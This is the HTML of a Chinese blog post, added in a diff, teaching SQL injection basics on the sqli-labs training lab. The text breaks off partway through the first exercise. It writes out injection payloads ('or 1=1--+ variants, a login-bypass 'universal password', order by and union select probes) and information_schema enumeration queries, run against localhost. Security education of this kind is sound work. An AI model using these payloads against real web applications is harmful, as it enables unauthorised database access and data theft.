@@ -1,0 +1,1414 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="sqli-lab之第一章 基础知识, 江南小虫虫的博客">
+    <meta name="description" content="声明本文内容参考了lcamry的mysql注入天书: http://www.cnblogs.com/lcamry/category/846064.html
+
+在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用拼接的方式形成一条">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>sqli-lab之第一章 基础知识 | 江南小虫虫的博客</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">江南小虫虫的博客</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/biaobai/表白.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-heart" style="zoom: 0.6;"></i>
+      
+      <span>给亲爱的老婆仔</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">江南小虫虫的博客</div>
+        <div class="logo-desc">
+            
+            尽力就行~~~
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/biaobai/表白.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heart"></i>
+			
+			给亲爱的老婆仔
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sqli-lab之第一章 基础知识</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli-lab环境搭建/">
+                                <span class="chip bg-color">sqli-lab环境搭建</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/渗透测试/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                            <a href="/categories/渗透测试/sqli-lab/" class="post-category">
+                                sqli-lab
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-05-22
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2019-11-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+				
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文内容参考了lcamry的mysql注入天书: <a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/category/846064.html</a></p>
+<blockquote>
+<p>在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用<code>拼接</code>的方式形成一条完整的数据库语言，而危险的是，在拼接 sql 语句的 时候，我们可以<strong>改变 sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的 <code>sql 注入</code></strong>。</p>
+</blockquote>
+<blockquote>
+<p>本章将介绍一些 mysql 注入的一些基础知识, 可能知识有点多, 希望大家认真看一遍, 实操一遍.</p>
+</blockquote>
+<h2 id="学习篇"><a href="#学习篇" class="headerlink" title="学习篇"></a>学习篇</h2><h3 id="0x01-注入的分类"><a href="#0x01-注入的分类" class="headerlink" title="0x01 注入的分类"></a>0x01 注入的分类</h3><blockquote>
+<p>下面这个是阿德玛表哥的总结的，现在理解不了可以跳过</p>
+</blockquote>
+<a id="more"></a>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190523110728.png" alt></p>
+<h3 id="0x02-系统函数"><a href="#0x02-系统函数" class="headerlink" title="0x02 系统函数"></a>0x02 系统函数</h3><blockquote>
+<p>这里介绍几个常用函数, 自己实操的话, 可以直接点击Kitematic的<code>EXEC</code>运行一个终端, 然后使用<code>mysql -uroot</code>进入mysql</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221135.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220924.png" alt></p>
+<ol>
+<li><p><code>version()</code>——MySQL 版本</p>
+<p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220935.png" alt></p>
+</li>
+<li><p><code>user()</code>——数据库用户名</p>
+<p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220946.png" alt></p>
+</li>
+<li><p><code>database()</code>——数据库名</p>
+<p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220956.png" alt></p>
+</li>
+<li><p><code>@@datadir</code>——数据库路径</p>
+<p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221008.png" alt></p>
+</li>
+<li><p><code>@@version_compile_os</code>——操作系统版本</p>
+<p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221018.png" alt></p>
+</li>
+</ol>
+<h3 id="0x03-字符串连接函数"><a href="#0x03-字符串连接函数" class="headerlink" title="0x03 字符串连接函数"></a>0x03 字符串连接函数</h3><p>在select数据时, 我们往往需要将数据进行连接后进行回显. 很多的时候想将多个数据或者多行数据进行输出的时候, 需要使用字符串连接函数. 而在mysql中，常见的字符串连接函函数有<code>concat()</code>, <code>group_concat()</code>, <code>concat_ws()</code>.</p>
+<p>举个例子, 不使用字符串连接函数时</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221028.png" alt></p>
+<p>但是这里存在的一个问题是, 当使用union联合注入时, 我们都知道, 联合注入要求前后两个选择的列数要相同, 这里<code>id</code>, <code>username</code>是两个列, 当我们要一个列的时候, (即回显位只有一个)该怎么办? 这时候就需要用到字符串连接函数了</p>
+<h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>语法如下:</p>
+<pre><code>concat(str1,str2,...)
+--没有分隔符地连接字符串
+--返回结果为连接参数产生的字符串
+--如有任何一个参数为NULL, 则返回值为 NULL
+--可以有一个或多个参数</code></pre><p>一般的我们都要用一个字符(这里是逗号)将各个项隔开, 便于数据的查看. 见下图:</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221039.png" alt></p>
+<p>下图是参数中有<code>NULL</code>的情况</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221048.png" alt></p>
+<h4 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h4><p>语法如下:</p>
+<pre><code>concat_ws(separator,str1,str2,...)
+--含有分隔符地连接字符串, 分隔符的位置会放在要连接的两个字符串之间
+--Separator为字符之间的分隔符, 可以是一个字符串, 也可以是其它参数
+--如果分隔符为 NULL, 则结果为 NULL
+--函数会忽略任何分隔符参数后的 NULL 值</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221058.png" alt></p>
+<p>下图是忽略<code>NULL</code>的情况</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221110.png" alt></p>
+<h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>语法如下:</p>
+<pre><code>group_concat(str1,str2,...)
+--连接一个组的所有字符串，并以`逗号`分隔每一条数据.</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522221123.png" alt></p>
+<h3 id="0x04-一般用于尝试的语句"><a href="#0x04-一般用于尝试的语句" class="headerlink" title="0x04 一般用于尝试的语句"></a>0x04 一般用于尝试的语句</h3><p>ps:<code>--+</code>可以用<code>#</code>替换，url 提交过程中 Url 编码后的<code>#</code>为<code>%23</code> </p>
+<pre><code>or 1=1--+
+&#39;or 1=1--+
+&quot;or 1=1--+
+)or 1=1--+
+&#39;)or 1=1--+
+&quot;) or 1=1--+
+&quot;))or 1=1--+</code></pre><p><strong>一般的代码为</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre>
+<p>此处考虑两个点</p>
+<ol>
+<li>一个是用一个单引号闭合前面的 <code>&#39;</code></li>
+<li>另一个是处理后面的<code>&#39;</code>, 一般采用两种思路, <strong>闭合后面的引号或者注释掉</strong>，注释掉采用<code>--+</code> 或者 <code>#(%23)</code></li>
+</ol>
+<h3 id="0x05-union-操作符的介绍"><a href="#0x05-union-操作符的介绍" class="headerlink" title="0x05 union 操作符的介绍"></a>0x05 union 操作符的介绍</h3><p><strong><code>UNION</code> 操作符用于合并两个或多个 SELECT 语句的结果集</strong>。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
+<h4 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL  UNION  语法"></a><code>SQL  UNION</code>  语法</h4><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name1 <span class="token keyword">UNION</span>
+<span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name2</code></pre>
+<p>ps：默认地，<strong>UNION 操作符选取不同的值</strong>。如果<strong>允许重复的值，请使用 <code>UNION ALL</code></strong>。</p>
+<h4 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL  UNION  ALL  语法"></a><code>SQL  UNION  ALL</code>  语法</h4><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name1 <span class="token keyword">UNION</span> <span class="token keyword">ALL</span>
+<span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table_name2</code></pre>
+<p>另外，<code>UNION</code> 结果集中的列名总是等于 <code>UNION</code> 中第一个<code>SELECT</code>语句中的列名。</p>
+<h3 id="0x06-sql-中的逻辑运算"><a href="#0x06-sql-中的逻辑运算" class="headerlink" title="0x06 sql 中的逻辑运算"></a>0x06 sql 中的逻辑运算</h3><blockquote>
+<p>这里讨论一下逻辑运算的问题</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220749.png" alt></p>
+<p>有一个问题 <code>elect * from users where id=1 and 1=1;</code> 这条语句为什么能够选择出<code>id=1</code> 的内容, <code>and 1=1</code> 到底起作用了没有? 这里就<strong>要清楚 sql 语句执行顺序</strong>了.</p>
+<p>同时这个问题我们在使用<code>万能密码</code>的时候会用到</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'admin'</span></code></pre>
+<p>我们可以用   <code>&#39;or 1=1#</code>  作为密码输入. 原因是为什么？</p>
+<p>这里涉及到一个逻辑运算, 当使用上述所谓的万能密码后, 构成的 sql 语句为：</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#'</span></code></pre>
+<p><strong>Explain</strong>:上面的这个语句执行后，我们在不知道密码的情况下就登录到了 admin 用户了。原 因 是 在 where 子 句 后 ， 我 们 可 以 看 到 三 个 条 件 语 句  <code>username=&#39;admin&#39; and password=&#39;&#39;or 1=1</code>。三个条件用 <code>and</code> 和<code>or</code> 进行连接。在 sql 中，我们 <strong><code>and</code> 的运算优先级大于 <code>or</code> 的运算优先级</strong>。因此可以看到 第一个条件（用 <code>a</code> 表示）是真的，第二个条件（用<code>b</code> 表示）是假的，<code>a and  b = false</code>, 第一个条件和第二个条件执行 and 后是假，再与第三个条件 or 运算，因为第三个条件 <code>1=1</code> 是恒成立的，所以<strong>结果自然就为真</strong>了。因此上述的语句就是恒真了。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.0b6a1385urs_1534071271.png" alt></p>
+<pre><code>(1) select * from users where id=1 and 1=1;
+(2) select * from users where id=1 &amp;&amp; 1=1;
+(3) select * from users where id=1 &amp; 1 =1;</code></pre><p>上述三者有什么区别？</p>
+<ul>
+<li>(1)和(2)是一样的，表达的意思是<code>id=1</code> 条件和 <code>1=1</code> 条件进行<code>与运算</code>。</li>
+<li>(3)的意思是 <code>id=1</code> 条件与 <code>1</code> 进行<code>&amp;位操作</code>，<code>id=1</code> 被当作 <code>true</code>，与<code>1</code> 进行 <code>&amp; 运算</code> 结果还是 1， 再进行<code>=操作</code>，<code>1=1</code>,还是 1（ps：<strong><code>&amp;</code>的优先级大于<code>=</code></strong>）</li>
+</ul>
+<blockquote>
+<p>Ps:此处进行的<code>位运算</code>。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从ascii 值反推回字符。（运用较少）</p>
+</blockquote>
+<h3 id="0x07-information-schema数据库"><a href="#0x07-information-schema数据库" class="headerlink" title="0x07 information.schema数据库"></a>0x07 information.schema数据库</h3><ul>
+<li><p>现在做一些 mysql 的基本操作。启动 mysql，然后通过<strong>查询检查下数据库</strong>:</p>
+<pre><code>  mysql -uroot
+  show databases;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215740.png" alt></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127215844.png" alt></p>
+</li>
+<li><p>选择数据库</p>
+<pre><code>  use 数据库名;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220804.png" alt></p>
+</li>
+<li><p>查看数据库中有哪些表</p>
+<pre><code>  show tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220815.png" alt></p>
+</li>
+<li><p>查看指定表的结构</p>
+<pre><code>  desc 表名;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220827.png" alt></p>
+</li>
+<li><p>接下来讨论下<strong>系统数据库</strong>，即<code>information_schema</code>。</p>
+</li>
+<li><p>首先说一下mysql的数据库<code>information_schema</code>，他是<code>系统数据库</code>，安装完就有，<strong>记录是当前数据库的数据库，表，列，用户权限</strong>等信息，下面说一下常用的几个表</p>
+<ul>
+<li><code>SCHEMATA</code>表:储存mysql<strong>所有数据库的基本信息</strong>，包括数据库名，编码类型路径等，<code>show databases</code>的结果取之此表。</li>
+<li><code>TABLES</code>表:储存mysql中的<strong>表信息</strong>，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。<code>show tables from schemaname</code>的结果取之此表</li>
+<li><code>COLUMNS</code>表：提供了<strong>表中的列信息</strong>，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是<code>show columns from schemaname.tablename</code>的结果取之此表。</li>
+</ul>
+</li>
+</ul>
+<pre><code>use information_schema;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220837.png" alt></p>
+<ul>
+<li><p>让我们来查看下表</p>
+<pre><code>  show tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220857.png" alt></p>
+</li>
+<li><p>让我们来枚举这张表</p>
+<pre><code>  desc tables;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127220140.png" alt></p>
+</li>
+<li><p>现在用下面的指令查询,一般手工注入使用这个查询，我们可以下载到表名。</p>
+<pre><code>  select  table_name  from    information_schema.tables   where   table_schema    =   &quot;security&quot;;</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190522220911.png" alt></p>
+</li>
+</ul>
+<h3 id="0x08-注入流程"><a href="#0x08-注入流程" class="headerlink" title="0x08 注入流程"></a>0x08 注入流程</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t0hdn0hc41_1534071286.png" alt></p>
+<ul>
+<li><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是<strong>先拿到<code>数据库名</code>，在获取到当前数据库名下的<code>数据表</code>，再获取当前数据表下的<code>列</code>，最后获取<code>数据</code></strong>。</p>
+</li>
+<li><p>sql 有一个系统数据库<code>information_schema</code><strong>存储着所有的数据库的相关信息</strong>，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。</p>
+<pre><code>  猜数据库
+  select schema_name from information_schema.schemata 
+  猜某库的数据表
+  select table_name from information_schema.tables where table_schema=’xxxxx’
+  猜某表的所有列
+  Select column_name from information_schema.columns where table_name=’xxxxx’
+  获取某列的内容
+  Select *** from ****</code></pre></li>
+</ul>
+<h2 id="实战篇"><a href="#实战篇" class="headerlink" title="实战篇"></a>实战篇</h2><h3 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h3><blockquote>
+<p>为了方便学习查看，可以在源码中的<code>$sql</code>下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的）</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.3qo9vp3r8h6_1534071351.png" alt></p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"你的 sql 语句是："</span><span class="token punctuation">.</span><span class="token variable">$sql</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>  </code></pre>
+<ul>
+<li><p>在<code>http://localhost/sqli-labs/Less-1/?id=1</code>后面直接加上一个<code>&#39;</code>,看下效果:</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.cttq5aa2fpp_1534071365.png" alt></p>
+</li>
+<li><p>从上述错误当中，我们可以看到提交到 sql 中的 <code>&#39;</code>在经过 sql 语句构造后形成   <code>&#39;1&#39;&#39; LIMIT 0,1</code>， 多加了一个<code>’</code>,单引号都不匹配,这样拿去查询肯定报错啊 。这种方式就是<strong>从错误信息中得到我们所需要的信息</strong>，那我们接下来想如何将多余的 <code>&#39;</code> 去掉呢？</p>
+<blockquote>
+<p><code>limit</code>： 第一个参数是结果集中的第几个，跟C语言的数组的索引(<strong>从0开始</strong>)一致,<br>第二个参数就是个数<br>如 <code>limit  1,2</code>  :返回第二行和第三行，因为<strong>1表示是第二行，2表示行数个数是2</strong></p>
+</blockquote>
+</li>
+<li><p>先尝试<code>&#39;or 1=1#</code>,<code>#</code>会将其后面的<code>&#39;</code>注释掉</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.qnnfatt1h5_1534071374.png" alt></p>
+<p>  出了点问题，原来浏览器没帮我把<code>#</code><strong>url编码</strong>,可以将<code>#</code>换成<code>%23</code>,也可换成<code>--+</code>注释,<code>+</code>浏览器会编码成<code>空格</code></p>
+<blockquote>
+<p>常用url编码:空格是%20，单引号是%27， 井号是%23，双引号是%22</p>
+</blockquote>
+</li>
+<li><p>尝试<code>&#39;or 1=1--+</code>,<code>--+</code>会将其后面的<code>&#39;</code>注释掉. 此时构造的 sql 语句就成了</p>
+<pre><code>  SELECT * FROM users WHERE id=&#39;1&#39;or 1=1--+&#39; LIMIT 0,1</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.hh6v5xu38xh_1534071382.png" alt></p>
+</li>
+<li><p>可以看到正常返回数据。</p>
+</li>
+<li><p><strong>接下里就是利用 <code>order by</code>猜字段</strong>。<code>Order by</code> :<strong>对前面的数据进行排序</strong>，<strong>由phpMyadmin可以知道,这里有三列数据</strong>，我们就只能用<code>order by 3</code>,超过 3 就会报错。<code>‘order by 4--+</code>的结果显示结果超出。其实<strong>1表示第一个栏位,2表示第二栏位; 依此类推</strong></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.5ehddneepuu_1534071388.png" alt></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.p0r5eogj11_1534071395.png" alt></p>
+</li>
+<li><p>最后从源代码中分析下为什么会造成注入？Sql 语句为<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>; <code>id 参数</code>在拼接 sql 语句时，未对 id 进行任何的过滤等操作，所以当提交<code>&#39;or 1=1--+</code>，直接构造的 sql 语句就是</p>
+<pre><code>  SELECT * FROM users WHERE id=’1’or 1=1-- ‘ LIMIT 0,1</code></pre><p>  这条语句因 <code>or 1=1</code> 所以为<strong>永恒真</strong>。</p>
+</li>
+<li><p>此外，此处介绍<code>union 联合注入</code>，<strong>union 的作用是将两个 sql 语句进行联合</strong>。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择<strong>列数要相同</strong>才可以。Union all 与 union 的区别是增加了<strong>去重</strong>的功能。我们这里根据上述 background 的知识，进行<code>information_schema</code> 知识的应用。</p>
+<pre><code>  http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39;union select 1,2--+</code></pre><p>  出现下图情况,说明两个sql语句列数不同</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.e8isiwe11qm_1534071400.png" alt></p>
